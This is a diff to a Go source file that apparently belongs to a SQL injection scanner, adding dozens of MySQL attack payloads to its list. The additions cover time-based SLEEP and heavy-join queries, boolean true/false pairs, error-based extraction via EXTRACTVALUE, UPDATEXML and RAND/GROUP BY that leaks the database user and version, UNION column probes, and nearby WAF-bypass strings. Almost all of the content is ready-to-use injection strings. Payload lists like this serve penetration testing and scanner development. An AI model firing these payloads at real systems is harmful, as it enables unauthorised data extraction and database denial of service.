@@ -60,7 +60,7 @@ var MySQL = PayloadGroup{
 		{Type: "time", Content: "' AND (SELECT SLEEP(5) WHERE 1=2)--"},
 		{Type: "time", Content: "') OR SLEEP(5)--"},
 		{Type: "time", Content: "')) OR SLEEP(5)--"},
-		{Type: "time", Content: "')) OR SLEEP(5)--"},
+		{Type: "time", Content: "1')) OR SLEEP(5)--"},
 
 		// ═══════════════════════════════════════════
 		// BOOLEAN-BASED (True/False comparison)
@@ -158,6 +158,66 @@ var MySQL = PayloadGroup{
 		{Type: "deep", Content: "' UNION SELECT @@GLOBAL.plugin_dir,NULL,NULL--"},
 
 		// ═══════════════════════════════════════════
+		// ADVANCED TIME-BASED (Heavy Queries)
+		// ═══════════════════════════════════════════
+		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM (SELECT 1)a JOIN (SELECT 1)b JOIN (SELECT 1)c JOIN (SELECT 1)d JOIN (SELECT 1)e JOIN (SELECT 1)f JOIN (SELECT 1)g JOIN (SELECT 1)h)--"},
+		{Type: "time", Content: "' AND (SELECT RAND(0) * SLEEP(5) FROM INFORMATION_SCHEMA.TABLES LIMIT 1)--"},
+		{Type: "time", Content: "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS a, INFORMATION_SCHEMA.COLUMNS b, INFORMATION_SCHEMA.COLUMNS c)--"},
+		{Type: "time", Content: "' AND (SELECT (SELECT SLEEP(5) FROM (SELECT 1) a))--"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT SLEEP(5)) a)--"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT(SLEEP(5))) a)--"},
+		{Type: "time", Content: "1' AND (SELECT+1 FROM(SELECT(SLEEP(5)))a)--"},
+		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT SLEEP(5)) a) LIMIT 1--"},
+		{Type: "time", Content: "' AND ELT(1,SLEEP(5))--"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT SLEEP(5)) a) AND '1'='1"},
+		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT SLEEP(5)) a) AND '%'='%"},
+		{Type: "time", Content: "') AND SLEEP(5)--"},
+		{Type: "time", Content: "')) AND SLEEP(5)--"},
+		{Type: "time", Content: "\" AND SLEEP(5)--"},
+		{Type: "time", Content: "\") AND SLEEP(5)--"},
+		{Type: "time", Content: "1' OR SLEEP(5)--"},
+		{Type: "time", Content: "1') OR SLEEP(5)--"},
+		{Type: "time", Content: "1\" OR SLEEP(5)--"},
+		{Type: "time", Content: "1\") OR SLEEP(5)--"},
+
+		// ADVANCED BOOLEAN (Edge Cases)
+		// ═══════════════════════════════════════════
+		{Type: "boolean", Content: "1') AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1') AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "' AND 1=1 AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "' AND 1=1 AND 1=2--", Expected: "false"},
+		{Type: "boolean", Content: "' OR 1=1 AND '1'='1", Expected: "true"},
+		{Type: "boolean", Content: "' OR 1=2 AND '1'='1", Expected: "false"},
+		{Type: "boolean", Content: "' AND NOT 1=2--", Expected: "true"},
+		{Type: "boolean", Content: "' AND NOT 1=1--", Expected: "false"},
+		{Type: "boolean", Content: "1' AND 1=1-- -", Expected: "true"},
+		{Type: "boolean", Content: "1' AND 1=2-- -", Expected: "false"},
+		{Type: "boolean", Content: "1' AND '1'='1' AND 1=1--", Expected: "true"},
+		{Type: "boolean", Content: "1' AND '1'='2' AND 1=1--", Expected: "false"},
+
+		// ADVANCED ERROR-BASED
+		// ═══════════════════════════════════════════
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(ROUND(RAND()*2),':',(SELECT user()))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a)--"},
+		{Type: "error", Content: "1' AND (SELECT 1 FROM (SELECT 1,2,3,COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT((SELECT user()),FLOOR(RAND()*2))) a)--"},
+		{Type: "error", Content: "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT SUBSTRING( @@VERSION, 1, 32))))--"},
+		{Type: "error", Content: "' AND UPDATEXML(1, CONCAT(0x3a,(SELECT SUBSTRING( @@VERSION, 1, 32))),1)--"},
+		{Type: "error", Content: "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT CONCAT_WS(0x3a,USER(),DATABASE(),VERSION()))))--"},
+
+		// ADVANCED UNION
+		// ═══════════════════════════════════════════
+		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--"},
+		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12--"},
+		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--"},
+		{Type: "union", Content: "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--"},
+		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"},
+		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"},
+		{Type: "union", Content: "1' UNION ALL SELECT 1,2,3,4,5--"},
+		{Type: "union", Content: "1\" UNION SELECT 1,2,3--"},
+		{Type: "union", Content: "') UNION SELECT 1,2,3--"},
+		{Type: "union", Content: "1') UNION SELECT 1,2,3--"},
+		{Type: "union", Content: "\") UNION SELECT 1,2,3--"},
+		{Type: "union", Content: "1\") UNION SELECT 1,2,3--"},
+
 		// WAF BYPASS (Encoding, Comments, Case)
 		// ═══════════════════════════════════════════
 		{Type: "bypass", Content: "' /*!50000%53eLEct*/ 1,2,3--"},
